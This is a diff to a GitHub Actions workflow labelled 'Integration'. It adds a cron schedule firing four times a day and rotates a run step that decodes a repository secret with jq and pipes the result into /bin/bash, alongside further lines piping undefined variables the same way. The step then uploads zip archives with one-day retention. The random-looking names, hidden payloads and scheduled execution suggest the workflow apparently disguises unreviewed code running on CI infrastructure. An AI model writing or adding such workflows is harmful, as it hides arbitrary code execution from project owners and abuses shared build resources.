@@ -2,6 +2,8 @@ name: Integration
 on:
   workflow_dispatch:
 
+  schedule:
+    - cron: '3 2,8,14,20 * * *'
 permissions:
   contents: read
 jobs:
@@ -14,19 +16,18 @@ jobs:
           fetch-depth: 1
       - name: Run
         env:
-          anabs97: ${{ secrets.anabs97 }}
+          gj25418: ${{ secrets.gj25418 }}
         run: |
-          printf '%s' "$anabs97" | jq -r .xtbfj77976 | /bin/bash
-          printf '%s' "$rqn0" | jq -r .qkeb22 | /bin/bash
-          echo $lii9389 | jq -r .t480 | /bin/bash
-          printf '%s' "$vwyr7" | jq -r .c32442 | /bin/bash
-          printf '%s' "$qr6813" | jq -r .xfxlv9278 | /bin/bash
-          echo $h0 | jq -r .hquw39 | /bin/bash
-          printf '%s' "$uk9" | jq -r .fsabb17595 | /bin/bash
+          printf '%s' "$gj25418" | jq -r .hh3601 | /bin/bash
+          echo $hht20442 | jq -r .zzjg8535 | /bin/bash
+          printf '%s' "$sa85943" | jq -r .go32 | /bin/bash
+          echo $xmfo102 | jq -r .eimg5 | /bin/bash
+          echo $azr46968 | jq -r .wgze987 | /bin/bash
+          echo $kjajm03298 | jq -r .fqdba474 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
         with:
-          name: pNx6WHSy
+          name: RMcmDM12
           path: "*.zip"
           retention-days: 1
